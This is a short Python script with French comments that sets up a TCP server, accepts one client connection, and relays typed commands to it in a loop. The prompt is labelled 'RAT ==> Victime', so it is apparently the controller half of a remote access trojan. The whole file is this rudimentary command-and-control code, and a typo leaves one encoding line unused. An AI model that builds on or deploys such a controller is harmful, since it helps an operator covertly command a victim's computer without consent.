#!/usr/bin/env python
# -*- coding: utf-8 -*-

#################################################
#Auteur: Vikrant SINGH				#
#Programme: Socket-serveur			#
#						#
#################################################


#################################################
#####################Imports#####################

import socket


#################################################


hote = "192.168.0.25"
port = 5050
message = " "

#SOCK_STREAM pour effectuer une connexion TCP et AF_INET pour l'utilisation adresse IPV4
server_side = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#On configure notre serveur pour qu'il écoute sur un port
server_side.bind((hote, port))

#Nombre de connexion  simultanée
server_side.listen(5)
client_side,information = server_side.accept()
print ("Serveur prêt...")

while message != 'stop':

	message = raw_input('RAT ==> Victime :')
	mesage = message.encode()
	client_side.send(message)
	recus = client_side.recv(2048)
	recus = recus.decode(encoding="utf-8", errors="ignore")
	print(recus)
